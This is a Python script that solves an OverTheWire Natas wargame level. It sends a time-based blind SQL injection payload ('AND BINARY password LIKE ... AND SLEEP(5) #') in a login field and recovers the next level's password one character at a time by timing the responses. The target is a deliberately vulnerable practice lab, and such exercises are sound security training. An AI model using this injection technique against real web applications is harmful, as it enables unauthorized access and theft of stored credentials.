import requests
import string
import time

pathToDir = 'C:\\Users\\niroj\\Documents\\Natas\\'
userName = "natas17"
url = "http://natas17.natas.labs.overthewire.org/"
password = open(pathToDir + 'password.txt', 'r').readlines()[16][8:40]
print(password)


# -------------------------- First page ----------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index.html", 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index.html")
except IOError as err:
    print(f"(-) unfortunately {err}")


# ---------------------------- source index file -------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index-source.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# -------------------------------- Final Page -------------------------------------

allString = string.ascii_uppercase + string.ascii_lowercase + string.digits
print(allString)

natasPassword = list()

while (len(natasPassword) < 32):
    for character in allString:

        startTime = time.time()
        cast = "".join(natasPassword) + character
        print(f'(*) Testing string: {cast}, Starting Time: {startTime}')

        data = {
            'username': f'natas18" AND BINARY password LIKE  "{cast}%"AND SLEEP(5) #',
            'submit': 'Check existence',
        }
        response = requests.post(url, auth = (userName, password), data = data)
        htmlDoc = response.text
        # print(htmlDoc)

        endTime = time.time()
        difference = endTime - startTime
        print(f'...End time: {endTime}, difference: {difference}\n')

# try:  
#     with open(pathToDir + "scripts\\temp\\result.html", 'w') as htmlContent:
#         htmlContent.writelines(htmlDoc)
#         print("(+) first page is stored successfully on the path as result.html")
# except IOError as err:
#     print(f"(-) unfortunately {err}")
        if (difference >= 5 ):
            natasPassword.append(character)
            print(f'Collected string: {cast}')
            break
    